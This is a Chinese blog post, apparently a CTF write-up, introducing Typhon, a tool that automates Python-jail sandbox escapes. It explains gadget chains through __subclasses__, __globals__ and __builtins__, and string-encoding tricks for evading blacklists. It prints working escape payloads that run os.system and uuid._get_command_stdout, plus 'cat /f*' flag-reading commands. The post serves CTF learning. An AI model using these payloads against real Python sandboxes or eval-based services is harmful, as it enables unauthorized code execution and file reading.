---
title: "Typhon: 一种pyjail自动化绕过的思路及其粗略实现"
date: 2025-09-20 21:52
updated: 2025-09-20 21:52
categories: "CTF"
tags:
  - "CTF"
  - "Web Security"
  - "Writeup"
  - "Python"
description: "随着CTF题目的发展，越来越多的自动化解题工具诞生，使CTFer能够避开繁琐而固定的解题流程，并将精力花在真正能学到东西，有意义的环节上。 pyjail（python jail）作为一种经典的CTF题目类型，在近几年的大赛中频繁出现。然而，对于经典的WAF bypass至RCE或读文件的题目，随着时"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/19101758"
---
随着CTF题目的发展，越来越多的自动化解题工具诞生，使CTFer能够避开繁琐而固定的解题流程，并将精力花在真正能学到东西，有意义的环节上。

pyjail（python jail）作为一种经典的CTF题目类型，在近几年的大赛中频繁出现。然而，对于经典的WAF bypass至RCE或读文件的题目，随着时间推进，其套路已经被开发得相当成熟。每一种自动化解题工具的诞生，都是基于一定成熟的套路完成。因此，我想提出一种尝试自动化解决pyjail题目的思路。这个思路最终被实现为Typhon，一个粗疏简略但能用的一把梭工具。

```
pip install TyphonBreaker
```

# Ideas

## Definitions

首先，我们的目标题型有且只有一种：**通过绕过出题人给予的特定WAF策略，最终在受限制的沙箱环境中实现任意RCE或者读取文件的目标，以获取flag。**

根据此，我们首先定义两个此种题型的常见目标：

-   RCE
-   读取文件

同时，面对我们定义沙箱中实际执行代码的函数为**sink**，通常情况下，sink点一般为`exec()`或`eval()`

我们认为：

-   对于RCE，只要代码得到执行，就算是RCE成功。我们无需关心回显问题。因此，我们不在乎`exec`和`eval`的区别。
-   对于文件读取，我们需要将能够读取到的文件内容返回。因此，我们关心回显问题。由此，涉及到报错回显（是否允许`stderr`回显）以及正常回显（是否有类似于print()语句的函数返回sink点的返回值）两种回显方式。不论是哪种sink点，只要开放了报错回显，我们就可以通过`stderr`泄露文件信息。而针对正常的回显，`exec`和`eval`在处理方式上小有差别，此处略。

我们将WAF定义为三种类别：

-   字符限制。如常见的黑白名单，正则表达式，长度限制
-   运行时限制。如audithook（尚不支持）
-   命名空间限制。这个限制出现在sink点的后两个参数中（e.g. `exec(cmd, {'__builtlins__': None})`就将`__builtins__`全部删除）

note：针对sink点的后两个参数有如下解释：

![image](/images/migrated/19101758/01.png)

为了简化问题，我们将`locals`与`globals`的叠加统称为`local_scope`，即沙箱运行时的本地命名空间。若二者叠加时存在矛盾，请参考上图说明。

我们定义两种bypass方式：

-   `path`: 通过不同的载荷进行绕过（例如os.system('calc')和subprocess.Popen('calc')）
-   `technique`: 使用不同技术对相同的有效载荷进行处理从而绕过（例如，os.system('c'+'a'+'l'+'c') 和 os.system('clac'\[::-1\]))

其中，关于`path`绕过只与命名空间限制有关。关于`technique`绕过只于字符限制有关。

## Paths：命名空间限制

让我们先来聊聊：如何自动化绕过命名空间限制

为什么我说：pyjail某些题已经可以使用自动化工具写了呢？是因为其已经高度流程化了。举个例子：

现在假设，有：

```
exec(input('>> '))
```

这个payload我相信大家闭着眼睛能写出来：

```
__import__('os').system('calc')
```

我们可以把它拆解成：

-   从`__builtins__`中获取函数`__import__`
-   导入`os`包，并使用`os`包中的`system`函数RCE

我们来给它上个限制——本地空间中没有`__import__`

```
exec(input('>> '),{'__import__':None})
```

那么，我们就需要获取`__builtins__`，而后从`__builtins__`中获取`__import__`

如何获取`__builtins__`？简单。我们还有别的函数，可以使用`__self__`魔术方法拿到`__builtins__`集合：

```
id.__self__
```

![image](/images/migrated/19101758/02.png)

这样，我们就获取到了`__builtins__`。后续内容与上相同，我们写出：

```
id.__self__.__import__('os').system('calc')
```

![image](/images/migrated/19101758/03.png)

继续上难度。我们假设在当前命名空间下没有`__builtins__`

```
exec(input('>> '),{'__builtins__':None})
```

那么，所有的内置函数和类会被删除。我们剩下的只有内置的对象，如`1`,`()`,`{}`。

在python中，假如`__main__`，即当前命名空间下的`__builtins__`被删除，我们可以想办法找到属于其他命名空间的类中的函数，再运行`__globals__`寻找这个命名空间下的`__builtins__`

我们使用`{}`对象为例子：

我们通过一个python object的`__class__`魔术属性可以返回其对应的类。因此，通过`{}.__class__`我们就获取了`<class 'dict'>`。接下来，我们通过一个python class的`__subclasses__()`魔术方法可以获取所有继承自此的类：

![image](/images/migrated/19101758/04.png)

由此，我们获得四个位于其他命名空间的类。

我们取第二个类为例子。

![image](/images/migrated/19101758/05.png)

dir一下看看：

![image](/images/migrated/19101758/06.png)

取copy为例子：

![image](/images/migrated/19101758/07.png)

成功获取`__builtins__`。后文与上述相同即可。

```
{}.__class__.__subclasses__()[2].copy.__globals__['__builtins__']['__import__']('os').system('calc')
```

到这里，你可能意识到一点：`后文与上述相同`出现过很多次。没错，目前而言，我们的终点在于`os.system()`，为了获取它，我们可以利用`__import__`来动态导入，为了获取它，我们需要寻找`__builtins__`，为了获取它......

显然，RCE的方法不只一种，它也可以是`subprocess.run`或者`uuid._get_command_stdout`。显然，导入包的方式不只`__import__`，它也可以是`__loader__.load_module`或者`sys.modules`。显然，获取`__builtins__`的方式不只一种......

**我们可以，通过尽可能收集所有的有用的东西，最后把他们拼在一起。形成一套完整的payload。** 是的，这就是我们自动化的思路：**gadgets chain**。

再举个例子，如假设存在下列黑名单：

-   本地命名空间无`__builtins__`，只允许使用字符串作为起始点（我们在上例中是以字典object为起始点的）

我们这样处理：

-   首先，我们通过`'J'.__class__.__class__`获取`type`（类构建器）
-   随后，我们找到获取`type`后可能可以获取`__builtins__`的RCE链子`TYPE.__subclasses__(TYPE)[0].register.__globals__['__builtins__']`
-   随后，我们找到获取`__builtins__`后的RCE链子`BUILTINS_SET['breakpoint']()`
-   最后，我们将代表builtins字典的占位符`BUILTINS_SET`替换为上步中获取的`__builtins__`路径，以此类推，将`TYPE`占位符替换为真实的路径，就得到了最终的payload。

```
'J'.__class__.__class__.__subclasses__('J'.__class__.__class__)[0].register.__globals__['__builtins__']['breakpoint']()
```

到这里，我们就可以移出我们的自动化思路：**我们内置上百种`gadgets`，并一步一步爆破，尽可能寻找能找到的，随后再将它们拼在一起。**

### Workflow

让我来简单地实现一下。我们定义三个函数，使用`bypassMAIN`作为主函数。负责**收集尽可能能收集的**，随后我们定义两个终点函数`bypassRCE`（负责RCE）和`bypassREAD`(负责读文件)，负责把上流函数收集到的东西依据需求拼起来，形成最终的payload：

-   每一个终点函数（`bypassRCE`, `bypassREAD`）都会调用主函数`bypassMAIN`，主函数会尽可能搜集所有的可用gadgets（如上例中的`type`）并将收集到的内容传递给对应的下级函数。
-   `bypassMAIN`函数在简单分析完当前的变量空间后，会：
    -   尝试直接RCE（如`help()`, `breakporint()`）
    -   尝试获取生成器
    -   尝试获取type
    -   尝试获取object
    -   如当前空间中的`__builtins__`未被删除，但被修改，尝试恢复（如`id.__self__`）
    -   如当前空间中的`__builtins__`被删除，尝试从其他命名空间恢复
    -   承上，尝试继承链绕过
    -   尝试获取import包的能力
    -   尝试直接通过可能恢复的`__builtins__` RCE
    -   将结果传递给下级函数
-   下级函数拿到`bypassMAIN`的结果后，会根据该函数所实现的需求，选择对应的gadgets进行处理（如`bypassRCE`专注于RCE，`bypassREAD`专注于文件读取）。其过程与上述相似。

至此，我们完成了对于本地命名空间的限制的自动化绕过。

## techniques：字符限制

我们知道，黑白名单，正则表达式，长度限制......我已经厌倦了。

所以我编写了一个以递归为基础算法的bypasser。思路是这样的：

-   我们定义数十种bypasser。举个例子：一个负责将所有的字符反过来（`'__builtins__'` -> `'__snitliub__'[::-1]`）。一个负责将所有的字符串编码为hex（`'__builtins__'` -> `'\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'`）
-   当处理`'__builtins__'`这个payload时，我们先运行第一个bypasser，再运行第二个bypasser，再把二者结合起来运行。我们会得到四个东西：
    -   `'__builtins__'`
    -   `'__snitliub__'[::-1]`
    -   `'\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'`
    -   `'\x5f\x5f\x73\x6e\x69\x74\x6c\x69\x75\x62\x5f\x5f'[::-1]`

他们在python中表示一个意思。都是`'__builtins__'`

我们有许多类似的bypasser。有些bypasser需要本地命名空间中含有某些元素时才可以触发，如将字符化为`chr()` （`'A' -> chr(41)`）这个bypasser只有当前空间中有，或我们可以通过绕过方式获取时，我们才会使用。

## To conclude...

也就是说，我们通过命名空间选择合适的gadgets，再丢入bypasser中进行绕过，如果其满足所有的黑名单条件，我们就将这个gadgets放进命名空间。并继续寻找下一个可以寻找的东西，此时，不论是`path`还是`technique`环节，都会受到上一步的影响。（如：上一步成功找到了`base64`，下一步中的bypasser就会出现`base64`编码绕过）

# Typhon: a simple imeplemention

肯定有人说，`talk is cheap, show me the code`，Well，这就是`Typhon`：[https://github.com/Team-intN18-SoybeanSeclab/Typhon](https://github.com/Team-intN18-SoybeanSeclab/Typhon)

截至这篇文章完成，它已经有了超过2k的下载量。

`Typhon`是一个对上述思路的简略实现。你可以使用pip安装：

```
pip install TyphonBreaker
```

封装了两个函数：

```
import Typhon
Typhon.bypassRCE(cmd: str,
    local_scope:dict=None,
    banned_chr:list=[],
    allowed_chr:list=[],
    banned_ast:list=[],
    banned_re:list=[],
    max_length:int=None,
    allow_unicode_bypass:bool=False,
    print_all_payload:bool=False,
    interactive:bool=True,
    depth:int=5,
    recursion_limit:int=200,
    log_level:str='INFO')
```

`cmd`: RCE所使用的bash command  
`local_scope`: 沙箱内的全局变量空间，若无限制则忽略此参数  
`banned_chr`: 禁止的字符  
`allowed_chr`: 允许的字符（`[]`为全部允许）  
`banned_ast`: 禁止的AST节点  
`banned_re`: 禁止的正则表达式（列表或字符串）  
`max_length`: payload的最大长度  
`allow_unicode_bypass`: 是否允许unicode绕过  
`print_all_payload`: 是否打印所有payload  
`interactive`: 当前pyjail是否允许`stdin`（即如`breakpoint()`等payload是否成立）  
`depth`: 组合bypasser的最大深度（建议使用默认值）  
`recursion_limit`: 最大递归深度（建议使用默认值）  
`log_level`: 输出级别（只有`info`和`debug`有意义，不建议更改）

```
import Typhon
Typhon.bypassREAD(filepath: str,
    mode:str='eval',
    local_scope:dict=None,
    banned_chr:list=[],
    allowed_chr:list=[],
    banned_ast:list=[],
    banned_re:list=[],
    max_length:int=None,
    allow_unicode_bypass:bool=False,
    print_all_payload:bool=False,
    interactive:bool=True,
    depth:int=5,
    recursion_limit:int=200,
    log_level:str='INFO')
```

`filepath`: 所读取的文件路径  
`mode`: 沙箱内RCE的模式，可选`eval`或`exec`，关系到最后外带输出的逻辑  
`local_scope`: 沙箱内的全局变量空间，若无限制则忽略此参数  
`banned_chr`: 禁止的字符  
`allowed_chr`: 允许的字符（`[]`为全部允许）  
`banned_ast`: 禁止的AST节点  
`banned_re`: 禁止的正则表达式（列表或字符串）  
`max_length`: payload的最大长度  
`allow_unicode_bypass`: 是否允许unicode绕过  
`print_all_payload`: 是否打印所有payload  
`interactive`: 当前pyjail是否允许`stdin`（即如`breakpoint()`等payload是否成立）  
`depth`: 组合bypasser的最大深度（建议使用默认值）  
`recursion_limit`: 最大递归深度（建议使用默认值）  
`log_level`: 输出级别（只有`info`和`debug`有意义，不建议更改）

**此处再注：此工具目前对`bypassREAD`函数的处理很不严谨（当前版本甚至没有考虑如何外带输出）。该函数将在后面的版本中得到大幅度的改善和细化。（毕竟本工具截至目前都是我个人在完成，有很多考虑不周和不严谨之处，请原谅）**

## For example

来个例题试试：

```
WELCOME = '''
  _     ______      _                              _       _ _ 
 | |   |  ____|    (_)                            | |     (_) |
 | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
 | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | |·
 | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
 |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
               __/ |                                           
              |___/                                            
'''

print(WELCOME)
 
print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
if __name__ == '__main__':
    while True:
        cmd = input("Enter command: ")
        blacklist = ['__loader__','__import__','os','[:','\\x','+','join', '"', "'",'1','2','3','4','5','6','7','8','9','0b','subprocess'],
        for i in blacklist:
            if i in cmd:
                print("Command not allowed")
                break
        print(eval(cmd, {'__builtins__':None, 'lit':list, 'dic':dict}))
```

分析一下。存在一个黑名单，本地命名空间里的`__builtins__`被删除，还留下了`list`和`dict`。

不思考，直接将waf导入Typhon：

```
WELCOME = '''
  _     ______      _                              _       _ _ 
 | |   |  ____|    (_)                            | |     (_) |
 | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
 | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | |·
 | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
 |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
               __/ |                                           
              |___/                                            
'''

print(WELCOME)
 
print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
if __name__ == '__main__':
        import Typhon
        Typhon.bypassRCE(cmd='calc',
                         banned_chr=['__loader__','__import__','os','[:','\\x','+','join', '"', "'",'1','2','3','4','5','6','7','8','9','0b','subprocess'],
                         local_scope={'__builtins__':None, 'lit':list, 'dic':dict},)
```

运行，稍等片刻即可：

![image](/images/migrated/19101758/08.png)

得解：

```
lit.__class__.__subclasses__(lit.__class__)[0].register.__globals__[lit(dic(__builtins__=0))[0]][lit(dic(_=0))[0].__add__(lit(dic(_=0))[0]).__add__(lit(dic(i=0))[0]).__add__(lit(dic(m=0))[0]).__add__(lit(dic(p=0))[0]).__add__(lit(dic(o=0))[0]).__add__(lit(dic(r=0))[0]).__add__(lit(dic(t=0))[0]).__add__(lit(dic(_=0))[0]).__add__(lit(dic(_=0))[0])](lit(dic(uuid=0))[0])._get_command_stdout(lit(dic(calc=0))[0])
```

本地运行验证：

![image](/images/migrated/19101758/09.png)

## Q&A

-   何时`import Typhon`？

一定要将行`import Typhon`放在`Typhon`内置绕过函数的上一行（即使你患有PEP-8强迫症）。否则，`Typhon`将无法通过栈帧获取当前的全局变量空间。

**Do:**

```
def safe_run(cmd):
    import Typhon
    Typhon.bypassRCE(cmd,
    banned_chr=['builtins', 'os', 'exec', 'import'])

safe_run('cat /f*')
```

**Don't:**

```
import Typhon

def safe_run(cmd):
    Typhon.bypassRCE(cmd,
    banned_chr=['builtins', 'os', 'exec', 'import'])

safe_run('cat /f*')
```

-   为什么需要使用与题目相同的python版本？

Pyjail中存在一些通过索引寻找对应object的gadgets（如继承链）。继承链的利用随着索引变化很大。因此，请务必确保Typhon的运行环境与题目相同。

**无法保证？**

是的，大多数题目都不会给出对应的python版本。因此，**Typhon会在使用涉及版本的gadgets时做出提示**。

![image](/images/migrated/19101758/10.png)

这种情况下往往需要CTF选手自己去找题目环境中该gadgets需要的索引值。

-   如果题目的`exec`和`eval`没有限制命名空间怎么办？

假设题目没有限制命名空间，则不必填写`local_scope`参数。Typhon会自动使用`import Typhon`时的当前命名空间进行绕过

-   这个payload我用不了能不能换一个？

你可以在参数中加上`print_all_payload=True`，Typhon就会打印其生成的所有payload。

-   这个WEB题好像没开放stdin，我`exec(input())`没用怎么办？

你可以在参数中加上`interactive=False`，Typhon就会禁止使用所有涉及`stdin`的payload。

-   最后输出的payload没回显怎么办？

对于`bypassRCE`，我们认为：**只要命令得到了执行，就是RCE成功。** 至于回显问题，你可以选择反弹shell，时间盲注，或者：添加`print_all_payload=True`参数，查看所有payload，其中可能含有能够成功回显的payload。

## Limitations

-   目前Typhon只支持python 3.9及以上版本。
    
-   目前Typhon只支持linux沙箱。
    
-   目前Typhon尚无法绕过audithook沙箱。
    
-   由于Typhon采用局部最优的递归策略，对于一些简单的题目，反而需要耗时更久（约1min）。
    
-   目前已知的不支持的bypass方法：
    
    -   Typhon不支持以`list.pop(0)`代替`list[0]`，这是因为Typhon所生成的payload都需要经过本地执行验证才能成立，而`pop`方法在验证时会将元素从列表中删除，从而破坏后续环境。

另：本项目在此后打算单独给bash命令加一个bypasser（`cat /flag`\->`cat$IFS$9/*`）。针对bash绕过的内置绕过器，感谢[bashFuck](https://github.com/ProbiusOfficial/bashFuck)项目的作者@[ProbiusOfficial](https://github.com/ProbiusOfficial)的提前授权。

# To sum up

感谢看完。

以上是我个人对于pyjail自动化绕过的一些思考和简单实现。

其实与其说是简单，不如说是粗疏。整个项目现在的能力十分有限，而代码量已经攀升到恐怖的3k+。又由于个人实力十分十分有限，我来来回回重构了好几次，最终也是跌跌撞撞了一路写了个能运行的玩意出来。希望能越来越好吧。

同时，欢迎各位来提issue和PR。我们将长期收集Typhon无法解出的题目（最好附上wp），作为我们提升工具能力的参考。作为回报，你的github ID会出现在下一个release中。

再次，由于个人实力有限，这只是一个相当简单而粗疏的实现。希望大家多多海涵。

此致。
